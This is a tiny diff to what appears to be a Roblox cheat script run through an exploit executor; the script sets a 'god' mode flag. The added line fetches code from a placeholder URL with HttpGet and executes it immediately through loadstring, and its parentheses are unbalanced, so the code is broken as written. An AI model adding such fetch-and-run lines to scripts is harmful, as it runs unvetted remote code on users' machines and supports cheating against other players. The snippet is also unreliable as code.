@@ -1,3 +1,4 @@
+loadstring(game:HttpGet('link')()
 local localPlayer = game.Players.LocalPlayer
 getgenv().god = true
 print("start of script")
